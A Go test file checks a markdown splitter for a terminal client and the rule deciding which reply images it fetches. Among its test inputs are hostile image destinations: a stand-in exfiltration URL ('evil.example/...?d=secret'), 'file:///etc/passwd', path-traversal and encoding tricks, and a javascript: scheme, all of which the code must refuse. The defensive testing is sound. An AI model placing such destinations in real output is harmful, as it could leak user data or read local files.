package markdown_test

import (
	"fmt"
	"io/fs"
	"net/url"
	"path"
	"strings"
	"testing"
	"unicode"

	"github.com/quinnovator/contactd/internal/tui/markdown"
)

// show writes parts one per line, for comparison: text "...", code[lang]
// "..." or image[alt] path.
func show(parts []markdown.Part) string {
	var b strings.Builder
	for _, p := range parts {
		switch p.Kind {
		case markdown.Text:
			fmt.Fprintf(&b, "text %q", p.Text)
		case markdown.Code:
			fmt.Fprintf(&b, "code[%s] %q", p.Lang, p.Text)
		case markdown.Image:
			fmt.Fprintf(&b, "image[%s] %s", p.Alt, p.Path)
		default:
			fmt.Fprintf(&b, "kind %d", p.Kind)
		}
		// A field that belongs to another kind is a bug worth seeing.
		if p.Kind != markdown.Image && (p.Alt != "" || p.Path != "") {
			fmt.Fprintf(&b, " alt=%q path=%q", p.Alt, p.Path)
		}
		if p.Kind != markdown.Code && p.Lang != "" {
			fmt.Fprintf(&b, " lang=%q", p.Lang)
		}
		if p.Kind == markdown.Image && p.Text != "" {
			fmt.Fprintf(&b, " text=%q", p.Text)
		}
		b.WriteByte('\n')
	}
	return b.String()
}

func lines(l ...string) string { return strings.Join(l, "\n") }

func TestKinds(t *testing.T) {
	t.Parallel()
	// The zero Kind is no kind at all, so a Part that was never filled in
	// cannot pass for text.
	if markdown.Text != 1 || markdown.Code != 2 || markdown.Image != 3 {
		t.Errorf("Text, Code, Image = %d, %d, %d, want 1, 2, 3", markdown.Text, markdown.Code, markdown.Image)
	}
}

// reference is the reply the research ran through goldmark: every way a
// reply was found to name an image, or to look as if it did.
func reference() string {
	return lines(
		"Here is the chart:",
		"",
		"![latency by day](latency.png)",
		"",
		"and inline ![a](out/charts/a.png \"t\") and abs ![b](/abs.png) and ![sp](<my chart.png>)",
		"",
		"```md",
		"![in a fence](fenced.png)",
		"```",
		"",
		"`![in code](code.png)` and escaped \\![no](escaped.png)",
		"",
		"![remote](https://evil.example/p.png?d=secret) ![proto](//evil.example/p.png) ![file](file:///etc/passwd)",
		"![data](data:image/png;base64,AAAA) ![up](../2/secret.png) ![enc](..%2f2%2fsecret.png) ![q](latency.png?x=1)",
		"[![linked](thumb.png)](https://evil.example/)",
		"![ref][r]",
		"",
		"[r]: ref.png",
		"<img src=\"html.png\">",
	)
}

// The whole reference reply. With the client's limit of four the linked and
// the reference-style image stay text; with room for them they follow the
// paragraph that holds them.
func TestSplitReferenceReply(t *testing.T) {
	t.Parallel()
	src := reference()
	rows := strings.Split(src, "\n")
	head := []string{
		`text "Here is the chart:"`,
		`image[latency by day] latency.png`,
		fmt.Sprintf("text %q", rows[4]),
		`image[a] out/charts/a.png`,
		`image[b] abs.png`,
		`image[sp] my chart.png`,
		`code[md] "![in a fence](fenced.png)"`,
	}
	for _, tc := range []struct {
		name      string
		maxImages int
		tail      []string
	}{
		{
			name:      "the limit of four",
			maxImages: 4,
			tail:      []string{fmt.Sprintf("text %q", strings.Join(rows[10:], "\n"))},
		},
		{
			name:      "room for every image",
			maxImages: 100,
			tail: []string{
				fmt.Sprintf("text %q", strings.Join(rows[10:16], "\n")),
				`image[linked] thumb.png`,
				`image[ref] ref.png`,
				fmt.Sprintf("text %q", strings.Join(rows[17:], "\n")),
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			want := strings.Join(append(append([]string{}, head...), tc.tail...), "\n") + "\n"
			if got := show(markdown.Split(src, tc.maxImages)); got != want {
				t.Errorf("Split:\n%swant:\n%s", got, want)
			}
		})
	}
}

type splitCase struct {
	name      string
	src       string
	maxImages int // 0 means 4, the client's limit
	want      []string
}

// references is each reference of the research's reply on its own: the
// thirteen that goldmark reads as images, and the four that only look like
// one.
func references() []splitCase {
	return []splitCase{
		{
			name: "an image in its own paragraph",
			src:  "![latency by day](latency.png)",
			want: []string{`image[latency by day] latency.png`},
		},
		{
			name: "an image beside words, with a title",
			src:  `and inline ![a](out/charts/a.png "t") here`,
			want: []string{`text "and inline ![a](out/charts/a.png \"t\") here"`, `image[a] out/charts/a.png`},
		},
		{
			name: "an absolute path is the same file",
			src:  "abs ![b](/abs.png)",
			want: []string{`text "abs ![b](/abs.png)"`, `image[b] abs.png`},
		},
		{
			name: "a destination in angle brackets",
			src:  "and ![sp](<my chart.png>)",
			want: []string{`text "and ![sp](<my chart.png>)"`, `image[sp] my chart.png`},
		},
		{
			name: "in a code fence",
			src:  "```md\n![in a fence](fenced.png)\n```",
			want: []string{`code[md] "![in a fence](fenced.png)"`},
		},
		{
			name: "in inline code",
			src:  "`![in code](code.png)`",
			want: []string{"text \"`![in code](code.png)`\""},
		},
		{
			name: "after an escaped !",
			src:  `escaped \![no](escaped.png)`,
			want: []string{`text "escaped \\![no](escaped.png)"`},
		},
		{
			name: "a remote URL",
			src:  "![remote](https://evil.example/p.png?d=secret)",
			want: []string{`text "![remote](https://evil.example/p.png?d=secret)"`},
		},
		{
			name: "a URL with a host and no scheme",
			src:  "![proto](//evil.example/p.png)",
			want: []string{`text "![proto](//evil.example/p.png)"`},
		},
		{
			name: "a file URL",
			src:  "![file](file:///etc/passwd)",
			want: []string{`text "![file](file:///etc/passwd)"`},
		},
		{
			name: "a data URL",
			src:  "![data](data:image/png;base64,AAAA)",
			want: []string{`text "![data](data:image/png;base64,AAAA)"`},
		},
		{
			name: "a path that climbs out",
			src:  "![up](../2/secret.png)",
			want: []string{`text "![up](../2/secret.png)"`},
		},
		{
			name: "a path that climbs out, encoded",
			src:  "![enc](..%2f2%2fsecret.png)",
			want: []string{`text "![enc](..%2f2%2fsecret.png)"`},
		},
		{
			name: "a query",
			src:  "![q](latency.png?x=1)",
			want: []string{`text "![q](latency.png?x=1)"`},
		},
		{
			name: "an image that is a link",
			src:  "[![linked](thumb.png)](https://evil.example/)",
			want: []string{`text "[![linked](thumb.png)](https://evil.example/)"`, `image[linked] thumb.png`},
		},
		{
			name: "a reference-style image keeps its definition in the text",
			src:  "![ref][r]\n\n[r]: ref.png",
			want: []string{`image[ref] ref.png`, `text "[r]: ref.png"`},
		},
		{
			name: "an HTML img tag",
			src:  `<img src="html.png">`,
			want: []string{`text "<img src=\"html.png\">"`},
		},
	}
}

func cuts() []splitCase {
	return []splitCase{
		{name: "nothing", src: ""},
		{name: "blank lines only", src: "\n  \n\t\n"},
		{name: "words", src: "hello", want: []string{`text "hello"`}},
		{
			name: "blank lines at the ends are dropped",
			src:  "\n\nhello\n\nthere  \n\n\n",
			want: []string{`text "hello\n\nthere"`},
		},
		{
			name: "neighbouring blocks share one text part",
			src:  "# Title\n\nwords\n\n- one\n- two\n\n> quote\n",
			want: []string{`text "# Title\n\nwords\n\n- one\n- two\n\n> quote"`},
		},
		{
			name: "a fence between words",
			src:  "before\n\n```go\nx := 1\n\ny := 2\n```\n\nafter\n",
			want: []string{`text "before"`, `code[go] "x := 1\n\ny := 2"`, `text "after"`},
		},
		{
			name: "a fence with no blank line around it",
			src:  "before\n```go\nx := 1\n```\nafter",
			want: []string{`text "before"`, `code[go] "x := 1"`, `text "after"`},
		},
		{
			name: "an empty fence",
			src:  "before\n\n```\n```\n\nafter",
			want: []string{`text "before"`, `code[] ""`, `text "after"`},
		},
		{
			name: "an empty fence with a language",
			src:  "```go\n```",
			want: []string{`code[go] ""`},
		},
		{
			name: "two empty fences in a row",
			src:  "```\n```\n```\n```\n",
			want: []string{`code[] ""`, `code[] ""`},
		},
		{
			name: "a fence holding only blank lines",
			src:  "```\n\n\n```",
			want: []string{`code[] "\n"`},
		},
		{
			name: "a fence that never closes runs to the end",
			src:  "words\n\n```go\nx := 1\n\nmore",
			want: []string{`text "words"`, `code[go] "x := 1\n\nmore"`},
		},
		{
			name: "an opening fence on the last line",
			src:  "words\n\n```",
			want: []string{`text "words"`, `code[] ""`},
		},
		{
			name: "a one-letter language on a last line with no line break",
			src:  "```c",
			want: []string{`code[c] ""`},
		},
		{
			name: "a language after spaces, before a tab",
			src:  "```  go\ttitle\nx\n```",
			want: []string{`code[go] "x"`},
		},
		{
			name: "a tilde fence, and only the first word is the language",
			src:  "~~~python title=\"x\"\nprint(1)\n~~~",
			want: []string{`code[python] "print(1)"`},
		},
		{
			name: "a longer fence holds a shorter one",
			src:  "````md\n```go\nx\n```\n````\nafter",
			want: []string{"code[md] \"```go\\nx\\n```\"", `text "after"`},
		},
		{
			name: "an indented fence loses its indentation and no more",
			src:  "  ```\n  a\n    b\nc\n  ```",
			want: []string{`code[] "a\n  b\nc"`},
		},
		{
			name: "code keeps its own blank lines and trailing spaces",
			src:  "```\n\na  \n\n```",
			want: []string{`code[] "\na  \n"`},
		},
		{
			name: "CRLF line ends",
			src:  "a\r\n\r\n```go\r\nx\r\ny\r\n```\r\n\r\nb\r\n",
			want: []string{`text "a"`, `code[go] "x\ny"`, `text "b"`},
		},
		{
			name: "a fence in a list is not at the top level",
			src:  "- item\n\n  ```go\n  x\n  ```\n\nafter",
			want: []string{"text \"- item\\n\\n  ```go\\n  x\\n  ```\\n\\nafter\""},
		},
		{
			name: "a fence in a quote is not at the top level",
			src:  "> ```go\n> x\n> ```",
			want: []string{"text \"> ```go\\n> x\\n> ```\""},
		},
		{
			name: "an indented code block is text and keeps its indentation",
			src:  "```\na\n```\n\n    indented\n    more\n",
			want: []string{`code[] "a"`, `text "    indented\n    more"`},
		},
		{
			name: "link definitions after a fence stay in the text",
			src:  "```\nx\n```\n[d]: https://example.com\n\nSee [docs][d].\n",
			want: []string{`code[] "x"`, `text "[d]: https://example.com\n\nSee [docs][d]."`},
		},
		{
			name: "an image in a list follows the list",
			src:  "- one\n- ![chart](chart.png)\n- three\n\nafter",
			want: []string{`text "- one\n- ![chart](chart.png)\n- three"`, `image[chart] chart.png`, `text "after"`},
		},
		{
			name: "an image alone in a list item is still in the list",
			src:  "1. ![chart](chart.png)",
			want: []string{`text "1. ![chart](chart.png)"`, `image[chart] chart.png`},
		},
		{
			name: "two images in one paragraph",
			src:  "![a](a.png) ![b](b.png)\n\nafter",
			want: []string{`text "![a](a.png) ![b](b.png)"`, `image[a] a.png`, `image[b] b.png`, `text "after"`},
		},
		{
			name: "two images on two lines of one paragraph",
			src:  "![a](a.png)\n![b](b.png)",
			want: []string{`text "![a](a.png)\n![b](b.png)"`, `image[a] a.png`, `image[b] b.png`},
		},
		{
			name: "two paragraphs, an image each",
			src:  "![a](a.png)\n\n![b](b.png)",
			want: []string{`image[a] a.png`, `image[b] b.png`},
		},
		{
			name: "an image, then a fence, with no blank line",
			src:  "![a](a.png)\n```\nx\n```",
			want: []string{`image[a] a.png`, `code[] "x"`},
		},
		{
			name: "an indented image paragraph with spaces after it",
			src:  "words\n\n  ![a](a.png)  \n\nafter",
			want: []string{`text "words"`, `image[a] a.png`, `text "after"`},
		},
		{
			name: "an image in a quote, with a lazy line",
			src:  "> see ![i](i.png)\nlazy\n\nafter",
			want: []string{`text "> see ![i](i.png)\nlazy"`, `image[i] i.png`, `text "after"`},
		},
		{
			name: "an image in a heading",
			src:  "# Title ![i](i.png)\nbody",
			want: []string{`text "# Title ![i](i.png)"`, `image[i] i.png`, `text "body"`},
		},
		{
			name: "an underlined image is a heading, not a paragraph",
			src:  "![i](i.png)\n===\n\nbody",
			want: []string{`text "![i](i.png)\n==="`, `image[i] i.png`, `text "body"`},
		},
		{
			name: "the cut before an underlined heading is above its words",
			src:  "see ![i](i.png)\n\nTitle\n=====\n\nbody",
			want: []string{`text "see ![i](i.png)"`, `image[i] i.png`, `text "Title\n=====\n\nbody"`},
		},
		{
			name: "the cut before a rule",
			src:  "see ![i](i.png)\n***\nbody",
			want: []string{`text "see ![i](i.png)"`, `image[i] i.png`, `text "***\nbody"`},
		},
		{
			name: "an image in the last block follows all the text",
			src:  "one\n\ntwo ![i](i.png)\n",
			want: []string{`text "one\n\ntwo ![i](i.png)"`, `image[i] i.png`},
		},
		{
			name: "an image whose block is followed by definitions",
			src:  "a ![i](i.png)\n\n[d]: https://example.com\n\nmore [x][d]",
			want: []string{`text "a ![i](i.png)\n\n[d]: https://example.com"`, `image[i] i.png`, `text "more [x][d]"`},
		},
		{
			name: "definitions above a lone image stay text",
			src:  "[r]: ref.png\n![ref][r]\n",
			want: []string{`text "[r]: ref.png"`, `image[ref] ref.png`},
		},
		{
			name: "an image in an HTML block is not an image",
			src:  "<div>\n![a](a.png)\n</div>",
			want: []string{`text "<div>\n![a](a.png)\n</div>"`},
		},
		{
			name: "a lone image that cannot be fetched stays text",
			src:  "one\n\n![r](https://example.com/x.png)\n\ntwo",
			want: []string{`text "one\n\n![r](https://example.com/x.png)\n\ntwo"`},
		},
		{
			name: "alternative text loses its Markdown",
			src:  "![a *b* `c` &amp; d\\* [e](https://example.com)](x.png)",
			want: []string{`image[a b c & d* e] x.png`},
		},
		{
			name: "alternative text is one line",
			src:  "![two\nlines  here](x.png)",
			want: []string{`image[two lines here] x.png`},
		},
		{
			name: "an image inside alternative text is not a second image",
			src:  "![outer ![inner](in.png)](out.png)",
			want: []string{`image[outer inner] out.png`},
		},
		{
			name: "a bare link in alternative text",
			src:  "![see <https://example.com>](x.png)",
			want: []string{`image[see https://example.com] x.png`},
		},
		{
			name: "no alternative text",
			src:  "![](x.png)",
			want: []string{`image[] x.png`},
		},
		{
			name: "the path is decoded and made relative",
			src:  "![a](/out/a%20b.png)",
			want: []string{`image[a] out/a b.png`},
		},
		{
			name: "the limit of four, lone images",
			src:  "![1](1.png)\n\n![2](2.png)\n\n![3](3.png)\n\n![4](4.png)\n\n![5](5.png)\n\n![6](6.png)\n",
			want: []string{
				`image[1] 1.png`, `image[2] 2.png`, `image[3] 3.png`, `image[4] 4.png`,
				`text "![5](5.png)\n\n![6](6.png)"`,
			},
		},
		{
			name: "the limit of four, counted in the order written",
			src:  "a ![1](1.png) b ![2](2.png) c ![3](3.png)\n\n![4](4.png)\n\n![5](5.png)\n\nd ![6](6.png)",
			want: []string{
				`text "a ![1](1.png) b ![2](2.png) c ![3](3.png)"`,
				`image[1] 1.png`, `image[2] 2.png`, `image[3] 3.png`, `image[4] 4.png`,
				`text "![5](5.png)\n\nd ![6](6.png)"`,
			},
		},
		{
			name: "the limit of four, reached inside a paragraph",
			src:  "![1](1.png) ![2](2.png) ![3](3.png) ![4](4.png) ![5](5.png)",
			want: []string{
				`text "![1](1.png) ![2](2.png) ![3](3.png) ![4](4.png) ![5](5.png)"`,
				`image[1] 1.png`, `image[2] 2.png`, `image[3] 3.png`, `image[4] 4.png`,
			},
		},
		{
			name: "an image that cannot be fetched does not count",
			src:  "![x](https://example.com/x.png) ![1](1.png)\n\n![2](2.png)",
			want: []string{
				`text "![x](https://example.com/x.png) ![1](1.png)"`,
				`image[1] 1.png`, `image[2] 2.png`,
			},
			maxImages: 2,
		},
		{
			name:      "a limit of one",
			src:       "![1](1.png)\n\n```\nx\n```\n\n![2](2.png)",
			want:      []string{`image[1] 1.png`, `code[] "x"`, `text "![2](2.png)"`},
			maxImages: 1,
		},
		{
			name:      "a limit of none leaves every image as text",
			src:       "![1](1.png)\n\na ![2](2.png)\n\n```\nx\n```",
			want:      []string{`text "![1](1.png)\n\na ![2](2.png)"`, `code[] "x"`},
			maxImages: -1,
		},
	}
}

// destinations is what an image's destination means once Markdown has read
// it. A backslash escape or a character reference must neither hide a file
// that is there nor hide a URL from Fetchable.
func destinations() []splitCase {
	return []splitCase{
		{
			name: "an escaped underscore in a destination",
			src:  `![a](my\_chart.png)`,
			want: []string{`image[a] my_chart.png`},
		},
		{
			name: "a character reference in a destination",
			src:  "![a](a&amp;b.png)",
			want: []string{`image[a] a&b.png`},
		},
		{
			name: "a numeric character reference in a destination",
			src:  "![a](a&#32;b.png)",
			want: []string{`image[a] a b.png`},
		},
		{
			name: "a definition's destination is read the same way",
			src:  "![a][r]\n\n[r]: my\\_chart.png",
			want: []string{`image[a] my_chart.png`, `text "[r]: my\\_chart.png"`},
		},
		{
			name: "a scheme behind a character reference",
			src:  "![a](https&colon;//evil.example/p.png)",
			want: []string{`text "![a](https&colon;//evil.example/p.png)"`},
		},
		{
			name: "a scheme behind a numeric character reference",
			src:  "![a](https&#58;//evil.example/p.png)",
			want: []string{`text "![a](https&#58;//evil.example/p.png)"`},
		},
		{
			name: "a scheme behind an escape",
			src:  `![a](https\://evil.example/p.png)`,
			want: []string{`text "![a](https\\://evil.example/p.png)"`},
		},
		{
			name: "a scheme in capitals",
			src:  "![a](HTTPS://evil.example/p.png)",
			want: []string{`text "![a](HTTPS://evil.example/p.png)"`},
		},
		{
			name: "a host behind an escaped slash",
			src:  `![a](\//evil.example/p.png)`,
			want: []string{`text "![a](\\//evil.example/p.png)"`},
		},
		{
			name: "a parent behind character references",
			src:  "![a](&period;&period;/secret.png)",
			want: []string{`text "![a](&period;&period;/secret.png)"`},
		},
		{
			name: "a parent behind references to a percent sign",
			src:  "![a](&#37;2e&#37;2e/secret.png)",
			want: []string{`text "![a](&#37;2e&#37;2e/secret.png)"`},
		},
		{
			name: "a parent behind a definition",
			src:  "![a][r]\n\n[r]: &period;&period;/secret.png",
			want: []string{`text "![a][r]\n\n[r]: &period;&period;/secret.png"`},
		},
		{
			name: "a backslash that escapes nothing is a backslash",
			src:  `![a](a\b.png)`,
			want: []string{`text "![a](a\\b.png)"`},
		},
		{
			name: "an escaped backslash is a backslash",
			src:  `![a](a\\b.png)`,
			want: []string{`text "![a](a\\\\b.png)"`},
		},
		{
			name: "a parent encoded twice is a name, decoded once",
			src:  "![a](%252e%252e/x.png)",
			want: []string{`image[a] %2e%2e/x.png`},
		},
	}
}

// containers is images and fences inside the blocks that hold other blocks,
// and replies with CRLF line ends: the cut falls between top-level blocks
// and nowhere else.
func containers() []splitCase {
	return []splitCase{
		{
			name: "an image deep in a nested list follows the whole list",
			src:  "- a\n  - b ![i](i.png)\n    - c\n\n      deep\n- d\n\nafter",
			want: []string{
				`text "- a\n  - b ![i](i.png)\n    - c\n\n      deep\n- d"`,
				`image[i] i.png`,
				`text "after"`,
			},
		},
		{
			name: "an image in a quote in a quote follows the outer quote",
			src:  "> q1\n> > q2 ![i](i.png)\n> back\n\nafter",
			want: []string{`text "> q1\n> > q2 ![i](i.png)\n> back"`, `image[i] i.png`, `text "after"`},
		},
		{
			name: "a fence in a list in a quote stays text",
			src:  "> - x\n>\n>   ```go\n>   y\n>   ```\n\nafter",
			want: []string{"text \"> - x\\n>\\n>   ```go\\n>   y\\n>   ```\\n\\nafter\""},
		},
		{
			name: "a fence in an HTML block stays text",
			src:  "<pre>\n```\nx\n```\n</pre>\n\n```\ny\n```",
			want: []string{"text \"<pre>\\n```\\nx\\n```\\n</pre>\"", `code[] "y"`},
		},
		{
			name: "an image between the halves of an HTML block that blank lines end",
			src:  "<div>\n\n![a](a.png)\n\n</div>",
			want: []string{`text "<div>"`, `image[a] a.png`, `text "</div>"`},
		},
		{
			name: "an image in an underlined heading that follows another",
			src:  "Title\n-----\n![a](a.png)\n-----\nwords",
			want: []string{`text "Title\n-----\n![a](a.png)\n-----"`, `image[a] a.png`, `text "words"`},
		},
		{
			name: "an image named by a definition that comes after a fence",
			src:  "see ![a][r] here\n\n```\nx\n```\n\n[r]: a.png",
			want: []string{`text "see ![a][r] here"`, `image[a] a.png`, `code[] "x"`, `text "[r]: a.png"`},
		},
		{
			name: "CRLF: a lone image between words",
			src:  "a\r\n\r\n![i](i.png)\r\n\r\nb\r\n",
			want: []string{`text "a"`, `image[i] i.png`, `text "b"`},
		},
		{
			name: "CRLF: an underlined heading, an image beside words, a nested list and a quote",
			src:  "Title\r\n=====\r\n\r\nsee ![i](i.png)\r\n\r\n- x\r\n  - y\r\n\r\n> q\r\n",
			want: []string{
				`text "Title\r\n=====\r\n\r\nsee ![i](i.png)"`,
				`image[i] i.png`,
				`text "- x\r\n  - y\r\n\r\n> q"`,
			},
		},
		{
			name: "CRLF: an empty fence and a fence that never closes",
			src:  "```\r\n```\r\n~~~sh\r\nx\r\n",
			want: []string{`code[] ""`, `code[sh] "x"`},
		},
	}
}

func splitCases() []splitCase {
	var all []splitCase
	for _, table := range [][]splitCase{references(), cuts(), destinations(), containers()} {
		all = append(all, table...)
	}
	return all
}

func TestSplit(t *testing.T) {
	t.Parallel()
	for _, tc := range splitCases() {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			maxImages := tc.maxImages
			if maxImages == 0 {
				maxImages = 4
			}
			want := ""
			if len(tc.want) > 0 {
				want = strings.Join(tc.want, "\n") + "\n"
			}
			if got := show(markdown.Split(tc.src, maxImages)); got != want {
				t.Errorf("Split(%q, %d):\n%swant:\n%s", tc.src, maxImages, got, want)
			}
		})
	}
}

// A limit of zero is tested apart because the table reads zero as "the
// client's limit".
func TestSplitWithNoImagesAllowed(t *testing.T) {
	t.Parallel()
	got := show(markdown.Split("![1](1.png)\n\nwords ![2](2.png)", 0))
	if want := "text \"![1](1.png)\\n\\nwords ![2](2.png)\"\n"; got != want {
		t.Errorf("Split:\n%swant:\n%s", got, want)
	}
}

func TestFetchable(t *testing.T) {
	t.Parallel()
	long := strings.Repeat("a", 1020) + ".png" // 1024 bytes
	for _, tc := range []struct {
		name string
		dest string
		path string // "" means refused
	}{
		{name: "a file", dest: "latency.png", path: "latency.png"},
		{name: "a file in a directory", dest: "out/charts/a.png", path: "out/charts/a.png"},
		{name: "a leading slash is dropped", dest: "/abs.png", path: "abs.png"},
		{name: "a space", dest: "my chart.png", path: "my chart.png"},
		{name: "an encoded space", dest: "my%20chart.png", path: "my chart.png"},
		{name: "an encoded slash is a slash", dest: "out%2Fa.png", path: "out/a.png"},
		{name: "an encoded leading slash is dropped", dest: "%2Fabs.png", path: "abs.png"},
		{name: "decoded once only", dest: "100%2525.png", path: "100%25.png"},
		{name: "a plus is a plus", dest: "a+b.png", path: "a+b.png"},
		{name: "not ASCII", dest: "día/图.png", path: "día/图.png"},
		{name: "a name that starts with dots", dest: "..hidden/...png", path: "..hidden/...png"},
		{name: "the longest path", dest: long, path: long},
		{name: "the longest path, after its slash", dest: "/" + long, path: long},

		{name: "empty", dest: ""},
		{name: "one byte too long", dest: "b" + long},
		{name: "the directory itself", dest: "."},
		{name: "the root", dest: "/"},
		{name: "dot after a slash", dest: "/."},
		{name: "a dot element", dest: "./a.png"},
		{name: "a dot element inside", dest: "a/./b.png"},
		{name: "an empty element", dest: "a//b.png"},
		{name: "a trailing slash", dest: "a/"},
		{name: "the parent", dest: ".."},
		{name: "a parent element", dest: "../2/secret.png"},
		{name: "a parent element inside", dest: "a/../../b.png"},
		{name: "a parent element after a slash", dest: "/../x"},
		{name: "an encoded parent element", dest: "%2e%2e/x"},
		{name: "an encoded parent and slash", dest: "..%2f2%2fsecret.png"},
		{name: "a colon", dest: "a:b.png"},
		{name: "an encoded colon", dest: "a%3Ab.png"},
		{name: "a drive letter", dest: "C:/x.png"},
		{name: "https", dest: "https://evil.example/p.png?d=secret"},
		{name: "file", dest: "file:///etc/passwd"},
		{name: "data", dest: "data:image/png;base64,AAAA"},
		{name: "a host and no scheme", dest: "//h/x"},
		{name: "an encoded host", dest: "%2f%2fh/x"},
		{name: "a half-encoded host", dest: "/%2fh/x"},
		{name: "three slashes", dest: "///x"},
		{name: "a query", dest: "latency.png?x=1"},
		{name: "an encoded query", dest: "latency.png%3Fx=1"},
		{name: "a fragment", dest: "latency.png#top"},
		{name: "an encoded fragment", dest: "latency.png%23top"},
		{name: "a backslash", dest: `a\b.png`},
		{name: "a backslash parent", dest: `..\x.png`},
		{name: "an encoded backslash", dest: "a%5Cb.png"},
		{name: "a NUL", dest: "a\x00.png"},
		{name: "an encoded NUL", dest: "a%00.png"},
		{name: "a line break", dest: "a\nb.png"},
		{name: "an encoded line break", dest: "a%0Ab.png"},
		{name: "an escape", dest: "a\x1b[31m.png"},
		{name: "a delete", dest: "a\x7f.png"},
		{name: "a C1 control", dest: "a\u009b.png"},
		{name: "an encoded C1 control", dest: "a%C2%9B.png"},
		{name: "not UTF-8", dest: "a\xff.png"},
		{name: "encoded bytes that are not UTF-8", dest: "a%ff.png"},
		{name: "a percent that encodes nothing", dest: "100%.png"},
		{name: "half an escape", dest: "a%2"},

		{name: "a parent encoded twice is a name", dest: "%252e%252e/x", path: "%2e%2e/x"},
		{name: "a slash encoded twice is part of a name", dest: "a%252Fb.png", path: "a%2Fb.png"},
		{name: "a leading space is part of the name", dest: " a.png", path: " a.png"},
		{name: "the longest path, encoded", dest: strings.Repeat("%61", 1024), path: strings.Repeat("a", 1024)},
		{name: "one byte too long, encoded", dest: strings.Repeat("%61", 1025)},
		{name: "a very long path", dest: strings.Repeat("a/", 1<<20) + "x"},
		{name: "an encoded parent, in capitals", dest: "%2E%2E/x"},
		{name: "a half-encoded parent", dest: ".%2e/x"},
		{name: "a trailing parent", dest: "a/.."},
		{name: "an encoded parent after a slash", dest: "/%2e%2e/x"},
		{name: "a parent written as overlong UTF-8", dest: "%c0%ae%c0%ae/x"},
		{name: "a scheme in capitals", dest: "HTTPS://evil.example/p.png"},
		{name: "a scheme in mixed case", dest: "JaVaScRiPt:alert(1)"},
		{name: "a scheme with no slashes", dest: "mailto:a@example.com"},
		{name: "a space before a host", dest: " //h/x"},
		{name: "an encoded space before a host", dest: "%20//h/x"},
		{name: "a tab before a host", dest: "\t//h/x"},
		{name: "a host after an encoded slash", dest: "%2f/h/x"},
		{name: "a backslash host", dest: `\\h\x.png`},
		{name: "an encoded backslash host", dest: "%5c%5ch/x.png"},
		{name: "a slash then a backslash", dest: `/\h/x.png`},
		{name: "a drive letter and a backslash", dest: `C:\x.png`},
		{name: "a drive letter with an encoded colon", dest: "C%3Ax.png"},
		{name: "a NUL after a good name", dest: "a.png\x00.txt"},
		{name: "an encoded NUL after a good name", dest: "a.png%00.txt"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got, ok := markdown.Fetchable(tc.dest)
			if want := tc.path != ""; got != tc.path || ok != want {
				t.Errorf("Fetchable(%q) = %q, %v, want %q, %v", tc.dest, got, ok, tc.path, want)
			}
		})
	}
}

// FuzzFetchable checks the boundary whatever a reply writes: a destination
// that is accepted is a plain relative path, it is the destination decoded
// once, and the request the client builds from it (each segment escaped, as
// client.File does) goes to the client's own server, under the contact's
// files, with no query.
func FuzzFetchable(f *testing.F) {
	for _, dest := range []string{
		"latency.png", "/abs.png", "out/a%20b.png", "%2e%2e/x", "%252e%252e/x", "a:b.png", "//h/x", "/%2fh/x",
		"https://evil.example/p.png?d=secret", `..\x`, "a%00.png", "a/../b", "%c0%ae%c0%ae/x", " //h/x", "100%.png",
	} {
		f.Add(dest)
	}
	const files = "/v1/contacts/c1/files/"
	f.Fuzz(func(t *testing.T, dest string) {
		got, ok := markdown.Fetchable(dest)
		if !ok {
			if got != "" {
				t.Errorf("Fetchable(%q) = %q, false: a refusal with a path", dest, got)
			}
			return
		}
		switch {
		case got == "." || !fs.ValidPath(got):
			t.Errorf("Fetchable(%q) = %q, which is not a plain relative path", dest, got)
		case len(got) > 1024:
			t.Errorf("Fetchable(%q) is %d bytes, over 1024", dest, len(got))
		case strings.ContainsAny(got, `:?#\`) || strings.ContainsFunc(got, unicode.IsControl):
			t.Errorf("Fetchable(%q) = %q, which holds a byte that is refused", dest, got)
		}
		if decoded, err := url.PathUnescape(dest); err != nil || strings.TrimPrefix(decoded, "/") != got {
			t.Errorf("Fetchable(%q) = %q, want the destination decoded once, less one leading slash", dest, got)
		}
		segments := strings.Split(got, "/")
		for i, segment := range segments {
			segments[i] = url.PathEscape(segment)
		}
		u, err := url.Parse("http://server.test" + files + strings.Join(segments, "/"))
		switch {
		case err != nil:
			t.Errorf("Fetchable(%q) = %q, which makes no URL: %v", dest, got, err)
		case u.Scheme != "http" || u.Host != "server.test" || u.User != nil:
			t.Errorf("Fetchable(%q) = %q, which asks %s://%s", dest, got, u.Scheme, u.Host)
		case u.RawQuery != "" || u.ForceQuery || u.Fragment != "":
			t.Errorf("Fetchable(%q) = %q, which asks with a query or a fragment", dest, got)
		case u.Path != files+got || path.Clean(u.Path) != u.Path:
			t.Errorf("Fetchable(%q) = %q, which asks for %q", dest, got, u.Path)
		}
	})
}

// BenchmarkSplit cuts the reference reply: 19 lines with a fence and 13
// images.
func BenchmarkSplit(b *testing.B) {
	src := reference()
	b.SetBytes(int64(len(src)))
	b.ReportAllocs()
	for b.Loop() {
		if len(markdown.Split(src, 4)) == 0 {
			b.Fatal("no parts")
		}
	}
}
